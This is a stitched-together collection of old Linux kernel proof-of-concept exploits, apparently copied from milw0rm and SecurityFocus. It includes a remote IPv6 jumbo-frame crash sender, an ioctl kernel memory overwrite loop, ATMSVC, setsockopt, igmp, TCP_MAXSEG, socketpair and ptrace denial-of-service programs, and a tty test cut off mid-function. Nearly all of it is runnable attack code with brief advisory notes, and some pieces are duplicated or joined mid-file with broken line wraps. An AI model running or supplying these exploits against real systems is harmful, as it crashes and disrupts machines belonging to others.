WriteTo = 0xc0100000; 
} 


printf("[++]call sys_ioctl will crash machine\n"); 
fflush(stdout); 

int loopi; 
for (loopi=0;loopi<0x100000 ;loopi++ ) 
{ 
printf("[++]will write data at 0x%x\n",WriteTo+loopi*4); 
fflush(stdout); 
iret = sys_ioctl(fd, 
CDROM_LAST_WRITTEN, 
WriteTo+loopi*4); 
if (iret ==-1) 
{ 
printf("[--]"); 
fflush(stdout); 
perror("ioctl"); 
//if in VMWARE ,rewrite ptr_idt adress will failed 
printf("[--]still aliving\n"); 
close(fd); 
return -1; 
} 
} 
close(fd); 
return 0; 
} 

// milw0rm.com [2005-05-17]
/*
 * Clemens Kurtenbach <ckurtenbach at s21sec . com>
 * PoC code for exploiting the jumbo bug found in 
 * linux kernels >=2.6.20 and <=2.6.21.1
 * gcc -O2 ipv6_jumbo_crash.c -o ipv6_jumbo_crash
 *
 */


/* io */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* network */
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <netdb.h>
#include <linux/if.h>

#define MY_FRAME_LEN 1145

char *resolve6(unsigned char *target) {
	char *ret_addr;
	struct in6_addr my_in6;
	char *glob_addr = (char *) &my_in6;
	struct addrinfo addr_hints, *addr_result;
	unsigned char out[64];

	memset(&addr_hints, 0, sizeof(addr_hints));
	addr_hints.ai_family = AF_INET6;

	if (getaddrinfo(target, NULL, &addr_hints, &addr_result) != 0) {
		printf("getaddrinfo() error\n");
		exit(1); 
	}
	if(getnameinfo(addr_result->ai_addr, addr_result->ai_addrlen, out, sizeof(out), NULL, 0, NI_NUMERICHOST) != 0){
		printf("getnameinfo() error\n");
		exit(1);
	}
	if(inet_pton(AF_INET6, out, glob_addr) < 0) {
		printf("inet_pton() error\n");
		exit(1);
	}
	if((ret_addr = malloc(16)) == NULL) {
		printf("malloc() error\n");
		exit(1);
	}
	memcpy(ret_addr, my_in6.s6_addr, 16);
	return ret_addr;
}

int main(int argc, char *argv[]) {

	if (argc < 4) {
		printf("usage: ./ipv6_jumbo_crash <fe80::1:2:3> <00:11:22:33:44:55> <eth0>\n");
		exit(1);
	}

	/* handle IPv6 destination */
	unsigned char *dest_ip = resolve6(argv[1]);

	/* handle MAC */
	unsigned char dest_mac[7];
	sscanf(argv[2], "%x:%x:%x:%x:%x:%x", 
			(unsigned int*)&dest_mac[0], (unsigned int*)&dest_mac[1], 
			(unsigned int*)&dest_mac[2], (unsigned int*)&dest_mac[3], 
			(unsigned int*)&dest_mac[4], (unsigned int*)&dest_mac[5]);

	/* handle interface */
	unsigned char *iface;
	iface = argv[3];

	/* buffer for ethernet frame */
	void *buffer = (void*)malloc(MY_FRAME_LEN);

	/* pointer to ethenet header */
	unsigned char *etherhead = buffer;
	struct ethhdr *eh = (struct ethhdr *)etherhead;

	/* our MAC address */
	unsigned char src_mac[6] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55 };
	unsigned char src_ip[16] = { 0xfe, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02};

	/* prepare socket */
	int s;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		printf("cannot create socket: [%d]\n",s);
		exit(1);
	}

	/* RAW communication */
	struct sockaddr_ll socket_address;
	socket_address.sll_family   = PF_PACKET;	
	socket_address.sll_protocol = htons(ETH_P_IP);	
	socket_address.sll_ifindex  = if_nametoindex(iface);
	socket_address.sll_hatype   = ARPHRD_ETHER;
	socket_address.sll_pkttype  = PACKET_OTHERHOST;
	socket_address.sll_halen    = ETH_ALEN;		

	/* set the frame header */
	memcpy((void*)buffer, (void*)dest_mac, ETH_ALEN);
	memcpy((void*)(buffer+ETH_ALEN), (void*)src_mac, ETH_ALEN);
	eh->h_proto = 0xdd86; // IPv6

	/* the buffer we want to send */
	unsigned char bad_buffer[] = { 
		0x60, 0x3b, 0x50, 0x15, 0x04, 0x08, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x43, 0x6e, 0xc2, 0x05, 0x23 };

	memcpy((void*)(buffer+14), (void*)bad_buffer, MY_FRAME_LEN);

	/* overwrite our src and dst ip */
	memcpy((void*)(buffer+22), (void*)src_ip, 16);
	memcpy((void*)(buffer+38), dest_ip, 16);

	/* send the buffer */
	int send_result = 0;
	send_result = sendto(s, buffer, MY_FRAME_LEN, 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
	if (send_result == -1) { 
		printf("could not send frame: [%d]\n", send_result); 
		exit(1);
	}
	else printf("frame send to ip [%s] with mac [%s] on iface [%s]\n",argv[1],argv[2],argv[3]);

	return 0;
}

// milw0rm.com [2008-01-11]
source: http://www.securityfocus.com/bid/26943/info

The Linux kernel is prone to a remote denial-of-service vulnerability because it fails to adequately validate specially crafted IPv6 'Hop-By-Hop' headers.

Attackers can exploit this issue to cause a kernel panic, denying service to legitimate users.

/*
 * Clemens Kurtenbach <ckurtenbach at s21sec . com>
 * PoC code for exploiting the jumbo bug found in 
 * linux kernels >=2.6.20 and <=2.6.21.1
 * gcc -O2 ipv6_jumbo_crash.c -o ipv6_jumbo_crash
 *
 */


/* io */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* network */
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <netdb.h>
#include <linux/if.h>

#define MY_FRAME_LEN 1145

char *resolve6(unsigned char *target) {
	char *ret_addr;
	struct in6_addr my_in6;
	char *glob_addr = (char *) &my_in6;
	struct addrinfo addr_hints, *addr_result;
	unsigned char out[64];

	memset(&addr_hints, 0, sizeof(addr_hints));
	addr_hints.ai_family = AF_INET6;

	if (getaddrinfo(target, NULL, &addr_hints, &addr_result) != 0) {
		printf("getaddrinfo() error\n");
		exit(1); 
	}
	if(getnameinfo(addr_result->ai_addr, addr_result->ai_addrlen, 
out, sizeof(out), NULL, 0, NI_NUMERICHOST) != 0){
		printf("getnameinfo() error\n");
		exit(1);
	}
	if(inet_pton(AF_INET6, out, glob_addr) < 0) {
		printf("inet_pton() error\n");
		exit(1);
	}
	if((ret_addr = malloc(16)) == NULL) {
		printf("malloc() error\n");
		exit(1);
	}
	memcpy(ret_addr, my_in6.s6_addr, 16);
	return ret_addr;
}

int main(int argc, char *argv[]) {

	if (argc < 4) {
		printf("usage: ./ipv6_jumbo_crash <fe80::1:2:3> 
<00:11:22:33:44:55> <eth0>\n");
		exit(1);
	}

	/* handle IPv6 destination */
	unsigned char *dest_ip = resolve6(argv[1]);

	/* handle MAC */
	unsigned char dest_mac[7];
	sscanf(argv[2], "%x:%x:%x:%x:%x:%x", 
			(unsigned int*)&dest_mac[0], (unsigned 
int*)&dest_mac[1], 
			(unsigned int*)&dest_mac[2], (unsigned 
int*)&dest_mac[3], 
			(unsigned int*)&dest_mac[4], (unsigned 
int*)&dest_mac[5]);

	/* handle interface */
	unsigned char *iface;
	iface = argv[3];

	/* buffer for ethernet frame */
	void *buffer = (void*)malloc(MY_FRAME_LEN);

	/* pointer to ethenet header */
	unsigned char *etherhead = buffer;
	struct ethhdr *eh = (struct ethhdr *)etherhead;

	/* our MAC address */
	unsigned char src_mac[6] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55 
};
	unsigned char src_ip[16] = { 0xfe, 0x80, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02};

	/* prepare socket */
	int s;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		printf("cannot create socket: [%d]\n",s);
		exit(1);
	}

	/* RAW communication */
	struct sockaddr_ll socket_address;
	socket_address.sll_family   = PF_PACKET;	
	socket_address.sll_protocol = htons(ETH_P_IP);	
	socket_address.sll_ifindex  = if_nametoindex(iface);
	socket_address.sll_hatype   = ARPHRD_ETHER;
	socket_address.sll_pkttype  = PACKET_OTHERHOST;
	socket_address.sll_halen    = ETH_ALEN;		

	/* set the frame header */
	memcpy((void*)buffer, (void*)dest_mac, ETH_ALEN);
	memcpy((void*)(buffer+ETH_ALEN), (void*)src_mac, ETH_ALEN);
	eh->h_proto = 0xdd86; // IPv6

	/* the buffer we want to send */
	unsigned char bad_buffer[] = { 
		0x60, 0x3b, 0x50, 0x15, 0x04, 0x08, 0x00, 0xa0, 0x00, 
0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00,
		0x00, 0x43, 0x6e, 0xc2, 0x05, 0x23 };

	memcpy((void*)(buffer+14), (void*)bad_buffer, MY_FRAME_LEN);

	/* overwrite our src and dst ip */
	memcpy((void*)(buffer+22), (void*)src_ip, 16);
	memcpy((void*)(buffer+38), dest_ip, 16);

	/* send the buffer */
	int send_result = 0;
	send_result = sendto(s, buffer, MY_FRAME_LEN, 0, (struct 
sockaddr*)&socket_address, sizeof(socket_address));
	if (send_result == -1) { 
		printf("could not send frame: [%d]\n", send_result); 
		exit(1);
	}
	else printf("frame send to ip [%s] with mac [%s] on iface 
[%s]\n",argv[1],argv[2],argv[3]);

	return 0;
}
/*
 * cve-2008-5079.c
 *
 * Linux Kernel <= 2.6.27.8 ATMSVC local DoS
 * Jon Oberheide <jon@oberheide.org>
 *
 * http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5079:
 *
 *   net/atm/svc.c in the ATM subsystem in the Linux kernel 2.6.27.8
 *   and earlier allows local users to cause a denial of service  
 *   (kernel infinite loop) by making two calls to svc_listen for the
 *   same socket, and then reading a /proc/net/atm/*vc file, related  
 *   to corruption of the vcc table.  
 *
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/atm.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
 
#define NR_CPUS 8
#define PROC_ATM "/proc/net/atm/pvc"
 
int
main(void)
{
    char *err, dummy[1024];
    int i, ret, sock, proc;
    struct atm_qos qos;
    struct sockaddr_atmsvc addr;
 
    printf("[+] creating ATM socket...\n");
 
    sock = socket(PF_ATMSVC, SOCK_DGRAM, 0);
    if (sock < 0) {
        err = "socket(2) for type PF_ATMSVC failed";
        printf("[-] PoC error: %s (%s)\n", err, strerror(errno));
        return 1;
    }
 
    memset(&qos, 0, sizeof(qos));
    qos.rxtp.traffic_class = ATM_UBR;
    qos.txtp.traffic_class = ATM_UBR;
    qos.aal = ATM_NO_AAL;
 
    printf("[+] setting socket QoS options...\n");
 
    ret = setsockopt(sock, SOL_ATM, SO_ATMQOS, &qos, sizeof(qos));
    if (ret == -1) {
        err = "setsockopt(2) for option SO_ATMQOS failed";
        printf("[-] PoC error: %s (%s)\n", err, strerror(errno));
        return 1;
    }
 
    memset(&addr, 0, sizeof(addr));
    addr.sas_family = AF_ATMSVC;
 
    printf("[+] binding socket...\n");
 
    bind(sock, (struct sockaddr *) &addr, sizeof(addr));
 
    printf("[+] socket listen...\n");
 
    listen(sock, 10);
 
    printf("[+] duplicate socket listen...\n");
 
    listen(sock, 10);
 
    printf("[+] attempting local DoS...\n");
 
    for (i = 0; i < NR_CPUS; ++i) {
        if (fork() != 0) {
            break;
        }
    }
 
    proc = open(PROC_ATM, O_RDONLY);
    if (proc == -1) {
        err = "opening " PROC_ATM " failed";
        printf("[-] PoC error: %s (%s)\n", err, strerror(errno));
        return 1;
    }
    ret = read(proc, &dummy, 1024);
    close(proc);
    
    printf("[-] Local DoS failed.\n");
 
    return 0;
}

// milw0rm.com [2008-12-10]
/* setsockopt proof of concept code by Julien TINNES (julien a.t cr0.org)
vulnerability found (as always by Paul Starzetz

This is only a lame POC which will crash the machine, no root shell here.
Maybe later, when everybody will have an updated box.

It should work on 2.6.1, 2.6.2 and 2.6.3 kernels.

Greets to Christophe Devine, too bad you wasn't with me for this one.

*/


#include <errno.h>
void perror (const char *s);

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/socket.h>

#define SOL_IP 0
#define MCAST_MSFILTER 48

/* mynumsrc and alloc_room control the overflow
* what we write can be controlled too (not needed
* here but needed for rootshell exploit
*/

#define mynumsrc 0x100 /* 0x100 should be enough, can be tweaked */
#define alloc_room 1 /* let it alocate only one u32 */

struct mygroup_filter
{
__u32 gf_interface; /* interface index */
struct sockaddr_storage gf_group; /* multicast address */
__u32 gf_fmode; /* filter mode */
__u32 gf_numsrc; /* number of sources */
struct sockaddr_storage gf_slist[mynumsrc]; /* interface index */
};


void
main (void)
{

int mysocket;
int sockprot;
struct mygroup_filter mygroup;
int optlen;
int i;
struct sockaddr_in *psin;

mygroup.gf_interface = 0;
mygroup.gf_numsrc = (1 << 30) - 4 + alloc_room;

mygroup.gf_group.ss_family = AF_INET;



for (i = 0; i < mynumsrc; i++)
{
psin = (struct sockaddr_in *) &mygroup.gf_slist[i];
psin->sin_family = AF_INET;
}


mysocket = socket (PF_INET, SOCK_STREAM, 0);

if (mysocket == -1)
{
perror ("Socket creation error: ");
exit (1);
}

optlen = sizeof (struct mygroup_filter);

printf ("Calling setsockopt(), this should crash the box...\n");
sockprot = setsockopt (mysocket, SOL_IP, MCAST_MSFILTER, &mygroup, optlen);

if (sockprot == -1)
{
perror ("Invalid setsockopt: ");
exit (1);
}
}




// milw0rm.com [2004-04-21]
int main(void)
{
	int ret;
	int csd;
	int lsd;
	struct sockaddr_un sun;

	/* make an abstruct name address (*) */
	memset(&sun, 0, sizeof(sun));
	sun.sun_family = PF_UNIX;
	sprintf(&sun.sun_path[1], "%d", getpid());

	/* create the listening socket and shutdown */
	lsd = socket(AF_UNIX, SOCK_STREAM, 0);
	bind(lsd, (struct sockaddr *)&sun, sizeof(sun));
	listen(lsd, 1);
	shutdown(lsd, SHUT_RDWR);

	/* connect loop */
	alarm(15); /* forcely exit the loop after 15 sec */
	for (;;) {
		csd = socket(AF_UNIX, SOCK_STREAM, 0);
		ret = connect(csd, (struct sockaddr *)&sun, sizeof(sun));
		if (-1 == ret) {
			perror("connect()");
			break;
		}
		puts("Connection OK");
	}
	return 0;
}// source: http://www.securityfocus.com/bid/44301/info
/* known for over a year, fixed in grsec
   bug is due to a bad limit on the max size of the stack for 32bit apps
   on a 64bit OS.   Instead of them being limited to 1/4th of a 32bit 
   address space, they're limited to 1/4th of a 64bit address space -- oops!
   in combination with vanilla ASLR, it triggers a BUG() as the stack 
   tries to expand around the address space when shifted
   Below mmap_min_addr you say? uh oh! ;)

   Reported to Ted Tso in December 2009
   Linus today (Aug 13 2010) silently fixes tangential issue:
   http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=320b2b8de12698082609ebbc1a17165727f4c893

   The second bug here is that the memory usage explodes within the 
   kernel from a single 128k allocation in userland
   The explosion of memory isn't accounted for by any task so it won't
   be terminated by the OOM killer

   curious what actual vuln was involved that they were trying
   to silently fix, as I don't think it's the one below
   clobbering data in a suid app by growing the stack into the mapping
   for the image? ;)  I smell privesc...mumblings of X server/recursion

   ulimit -s unlimited
   ./64bit_dos

   SELinux is here to save us though with its fine-grained controls!
   Wait, it doesn't?
   Clearly the solution is to throw a buggy KVM on top of it
   Not enough?  Ok, we'll throw in an extra SELinux, that'll really 
   throw those hackers off when they use the same exact exploit on the 
   host as they do on the guest!
   COMMON CRITERIA HERE I COME!
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/personality.h>

#define NUM_ARGS 24550

int main(void)
{
        char **args;
        char *str;
        int i;

	/* not needed, just makes it easier for machines with less RAM */
	personality(PER_LINUX32_3GB);

        str = malloc(128 * 1024);
        memset(str, 'A', 128 * 1024 - 1);
        str[128 * 1024 - 1] = '\0';
        args = malloc(NUM_ARGS * sizeof(char *));
        for (i = 0; i < (NUM_ARGS - 1); i++)
                args[i] = str;
        args[i] = NULL;

        execv("/bin/sh", args);
        printf("execve failed\n");

        return 0;
}
/* Linux Kernel <= 2.6.37 local kernel DoS (CVE-2010-4165)
 * =======================================================
 * A divide by 0 error occurs in tcp_select_initial_window
 * when processing user supplied TCP_MAXSEG facilitating a
 * local denial-of-service condition (kernel oops!) in all
 * Linux Kernel 2.6.x branch (2.6.37 & below). This issue 
 * can be triggered easily with a call to setsockopt() on 
 * a listening network socket and then establishing a TCP
 * connection to the awaiting socket. 
 * 
 * -- prdelka
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>


int main() {
	int optval, optlen, ret, sd, sd2, pid;
	char *host = "localhost";	
	struct sockaddr_in locAddr;
	struct sockaddr_in servAddr;
	struct sockaddr_in dstAddr;
	printf("[ Linux Kernel tcp_select_initial_window divide by 0 DoS\n");	
	sd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&servAddr,0,sizeof(servAddr));
	memset(&dstAddr,0,sizeof(dstAddr));
        servAddr.sin_family = AF_INET;
        servAddr.sin_port = htons(60000);
        servAddr.sin_addr.s_addr = INADDR_ANY;
	dstAddr.sin_family = AF_INET;
	inet_aton("127.0.0.1", &dstAddr.sin_addr);
	dstAddr.sin_port = htons(60000);
        if((bind(sd,(struct sockaddr *)&servAddr,sizeof(struct sockaddr))) == -1){
                printf("[ Cannot bind listener service\n");
                exit(-1);
        }
	listen(sd,4);
	optval = 12;
	ret = setsockopt(sd, IPPROTO_TCP, TCP_MAXSEG, &optval, sizeof(optval));
	if(ret==0)
	{
		printf("[ System is not patched against CVE-2010-4165\n[ Goodnight, sweet prince.\n");
		int sin_size = sizeof(struct sockaddr_in);
		switch(pid = fork())
		{
			case 0:
				sd = accept(sd,(struct sockaddr *)&locAddr,&sin_size);
				sleep(3);
			default:
				sd2 = socket(AF_INET, SOCK_STREAM, 0);
				connect(sd2, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
				sleep(3);
		}
	}
	printf("[ System is patched, no dreams for this prince\n");
	return 0;
}
/*
Simple kernel attack using socketpair. easy, 100% reproductiblle, works
under guest. no way to protect :(

Simple kernel attack using socketpair. easy, 100% reproductiblle,
works under guest. no way to protect :(

See source attached.

Process become in state 'Running' but not killalble via kill -KILL.

eat 100% CPU, eat all available internal  file descriptors  in kernel :(

-- 
Segmentation fault
*/

#include <sys/socket.h>
#include <sys/un.h>

static int send_fd (int unix_fd, int fd)
{
  struct msghdr msgh;
  struct cmsghdr *cmsg;
  char buf[CMSG_SPACE (sizeof (fd))];
  memset (&msgh, 0, sizeof (msgh));

  memset (buf, 0, sizeof (buf));

  msgh.msg_control = buf;
  msgh.msg_controllen = sizeof (buf);

  cmsg = CMSG_FIRSTHDR (&msgh);
  cmsg->cmsg_len = CMSG_LEN (sizeof (fd));
  cmsg->cmsg_level = SOL_SOCKET;

  cmsg->cmsg_type = SCM_RIGHTS;

  msgh.msg_controllen = cmsg->cmsg_len;

  memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
  return sendmsg (unix_fd, &msgh, 0);
}

int main ()
{
  int fd[2], ff[2];

  int target;
  if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)==-1)
    return 1;
  for (;;)
  {
    if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)==-1)
        return 2;
    send_fd (ff[0], fd[0]);
    send_fd (ff[0], fd[1]);

    close (fd[1]);
    close (fd[0]);
    fd[0] = ff[0];
    fd[1] = ff[1];
  }
}/*
* Linux igmp.c local DoS
* Warning: this code will crash your machine!
*
* gcc -O2 mreqfck.c -o mreqfck
*
* Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/types.h>

#define MCAST_INCLUDE                   1
#define IP_MSFILTER                     41

#define IP_UNBLOCK_SOURCE               37
#define IP_BLOCK_SOURCE                 38

struct ip_msfilter
{
   __u32 imsf_multiaddr;
   __u32 imsf_interface;
   __u32 imsf_fmode;
   __u32 imsf_numsrc;
   __u32 imsf_slist[1];
};

struct ip_mreq_source
{
   __u32 imr_multiaddr;
   __u32 imr_interface;
   __u32 imr_sourceaddr;
};

void
fatal (const char *message)
{
   printf ("\n");
   if (!errno)
     {
         fprintf (stdout, "FATAL: %s\n", message);
     }
   else
     {
         fprintf (stdout, "FATAL: %s (%s) ", message,
                  (char *) (strerror (errno)));
     }
   printf ("\n");
   fflush (stdout);
   exit (1);
}

int
main ()
{
   int s, r, l;
   struct ip_mreqn mr;
   struct ip_msfilter msf;
   struct ip_mreq_source ms;
   in_addr_t a1, a2;

   s = socket (AF_INET, SOCK_DGRAM, 0);
   if (s < 0)
       fatal ("socket");

//      first join mcast group
   memset (&mr, 0, sizeof (mr));
   mr.imr_multiaddr.s_addr = inet_addr ("224.0.0.199");
   l = sizeof (mr);
   r = setsockopt (s, SOL_IP, IP_ADD_MEMBERSHIP, &mr, l);
   if (r < 0)
       fatal ("setsockopt");

//      add source filter count=1
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_BLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt2");

//      del source filter count = 0
//      imr_multiaddr & imr_interface must correspond to ADD
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt2");

//      del again, count = -1
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt3");

//      crash
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt4");

   getchar ();

   return 0;
}

// milw0rm.com [2004-12-14]
source: http://www.securityfocus.com/bid/29945/info

The Linux kernel is prone to a local denial-of-service vulnerability caused by a race condition.

Attackers can exploit this issue to cause the kernel to become unresponsive, denying service to legitimate users. 

#include <stdlib.h>
#include <sys/ptrace.h>

int main(int argc, char *argv[])
{
	pid_t pid = atoi(argv[1]);

	while (1)
		ptrace(PTRACE_ATTACH, pid, NULL, NULL);

	return 0;
}


source: http://www.securityfocus.com/bid/29945/info
 
The Linux kernel is prone to a local denial-of-service vulnerability caused by a race condition.
 
Attackers can exploit this issue to cause the kernel to become unresponsive, denying service to legitimate users. 

/* This software is provided 'as-is', without any express or implied
   warranty.  In no event will the authors be held liable for any 
damages
   arising from the use of this software.
   
   Permission is granted to anyone to use this software for any purpose,
   including commercial applications, and to alter it and redistribute 
it
   freely.  */

#ifdef __ia64__
#define ia64_fpreg ia64_fpreg_DISABLE
#define pt_all_user_regs pt_all_user_regs_DISABLE
#endif	/* __ia64__ */
#include <sys/ptrace.h>
#ifdef __ia64__
#undef ia64_fpreg
#undef pt_all_user_regs
#endif	/* __ia64__ */
#include <linux/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#if defined __i386__ || defined __x86_64__
#include <sys/debugreg.h>
#endif

#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>

/* WARNING: The real testing count is probably unbound.  */
#define DEFAULT_TESTTIME 10	/* seconds */

static pid_t pid;

static void
cleanup (void)
{
  if (pid != 0)
    kill (pid, SIGKILL);
}

static void
handler_fail (int signo)
{
  cleanup ();

  signal (signo, SIG_DFL);
  raise (signo);
}

static void *thread_func(void *argv0_pointer)
{
	execl("/proc/self/exe", argv0_pointer, "child", NULL);
	abort ();
	/* NOTREACHED */
}

int main(int argc, const char *argv[])
{
	char *testtime = getenv ("TESTTIME");
	time_t testend = time (NULL) + (testtime != NULL ? atoi 
(testtime)
							 : 
DEFAULT_TESTTIME);
	unsigned long loops;
	pthread_t thread;

	atexit (cleanup);
	signal (SIGABRT, handler_fail);
	signal (SIGINT, handler_fail);

	if ((argc != 2 || strcmp (argv[1], "child") != 0) && (pid = 
fork())) {
		loops = 0;
		do {
			ptrace(PTRACE_ATTACH, pid, NULL, 0);
			ptrace(PTRACE_DETACH, pid, NULL, 0);
			loops++;
		} while (time (NULL) < testend);
		return 0;
	}

	if (pthread_create(&thread, NULL, thread_func, (void *) 
argv[0]))
		perror("pthread_create");

	while (1)
		pause();
	/* NOTREACHED */
	abort ();
}

source: http://www.securityfocus.com/bid/36191/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected kernel, denying service to legitimate users. Given the nature of this issue, attackers may also be able to execute arbitrary code, but this has not been confirmed.

This issue was introduced in Linux kernel 2.6.26 and fixed in 2.6.31-rc8. 

/* gcc -o KernelTtyTest KernelTtyTest.c -Wall -O2 -lutil */
#define _GNU_SOURCE 1
#include <stdio.h>
#include <pty.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <setjmp.h>
#include <ctype.h>
#define POLL_TIMEOUT (10*1000)  /* in milliseconds */
#define LASTBUFSZ  10000
#define CMDBUFSZ 10000
#define SIGINT_LONGJMP 0
#define SIGINT_VAR 1
static void putstr(char *str, FILE *out)
{
	int c;
	for (c = *str++; c; c = *str++) {
		if (iscntrl(c)) {
			putc('\\', out);
			switch(c) {
			case '\n':  putc('n', out); break;
			case '\r':  putc('r', out); break;
			default: printf("%03o", c); break;
			}
		} else {
			putc(c, out);
		}
	}
}
static void print_lastbytes(char *lastbytes, size_t totalbytes, FILE *out)
{
	char *start = lastbytes;
	if (totalbytes < LASTBUFSZ)
		start = &lastbytes[LASTBUFSZ - totalbytes];
	fprintf(out, "lastbytes: '");
	putstr(start, out);
	fprintf(out, "'");
}
static void expect(int masterfd, char *str, size_t len)
{
	char lastbytes[LASTBUFSZ + 1];
	size_t totalbytes = 0;
	memset(lastbytes, sizeof(lastbytes), 0);

	for (;;) {
	  	char buf[1];
		ssize_t bytes;
		int ret;
		struct pollfd fds = {
			.fd = masterfd,
			.events = POLLIN | POLLERR | POLLHUP,
			.revents = 0,
		};
		ret = poll(&fds, 1, POLL_TIMEOUT);
		if (ret == 0) {
			fprintf(stderr, "Timeout while waiting for '");
			putstr(str, stderr);
			fprintf(stderr, "' ");
			print_lastbytes(lastbytes, totalbytes, stderr);
			fprintf(stderr,"\n");
			exit(5);
		}
		else if (ret < 0) {
			fprintf(stderr, "poll failed: %s\n", strerror(errno));
			exit(4);
		}
		bytes = read(masterfd, buf, 1);
		if (bytes == 1) {
			totalbytes++;
			memmove(lastbytes, lastbytes +1, LASTBUFSZ);
			lastbytes[LASTBUFSZ - 1] = buf[0];
			lastbytes[LASTBUFSZ] = '\0';
			if (memcmp(&lastbytes[LASTBUFSZ - len], str, len) == 0)
				return;
		}
		else if (bytes < 0) {
			fprintf(stderr, "read failed: %s\n",
				strerror(errno));
			print_lastbytes(lastbytes, totalbytes, stderr);
			fprintf(stderr,"\n");
			abort();
			exit(3);
		}
	}
}
static void resync(int masterfd)
{
	static unsigned count;
	char cookie[100];
	char cmd[1000];
	char reply[1000];
	ssize_t written, bytes;
	snprintf(cookie, sizeof(cookie), "_%u_", ++count);
	bytes = snprintf(cmd, sizeof(cmd), "echo %s\n", cookie);
	written = 0;
	while (bytes) {
		ssize_t sent;
		sent = write(masterfd, cmd + written, bytes);
		if (sent >= 0) {
			written += sent;
			bytes -= sent;
		} else if ((errno != EAGAIN) && (errno != EINTR)) {
			fprintf(stderr, "Write to child failed: %s\n", strerror(errno));
			exit(2);  
		}
	}
	snprintf(reply, sizeof(reply), "\n%s", cookie);
	expect(masterfd, reply, strlen(reply));
}
#if SIGINT_VAR
static volatile sig_atomic_t saw_sigint;
#endif

static void process_cmd(void)
{
	char cmdbuf[CMDBUFSZ];
	size_t cmdlen;
	char buf[1];
	cmdlen = 0;
	for (;;) {
		ssize_t bytes;
#if SIGINT_VAR
		if (saw_sigint) {
			saw_sigint = 0;
			printf("^C\n");
			fflush(stdout);
			return;
		}
#endif
		bytes = read(STDIN_FILENO, buf, 1);
		if (bytes == 1) {
			cmdbuf[cmdlen] = '\0';
			putchar(buf[0]);
			fflush(stdout);
			if (buf[0] == '\n') {
				if (cmdlen == 0) {
					printf("> ");
					fflush(stdout);
				}
				else if (memcmp("echo ", cmdbuf, 5) == 0) {
